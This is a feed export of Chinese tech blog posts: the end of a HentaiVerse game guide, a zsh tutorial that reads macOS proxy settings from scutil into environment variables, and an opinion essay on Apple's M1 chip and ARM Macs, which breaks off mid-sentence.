时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 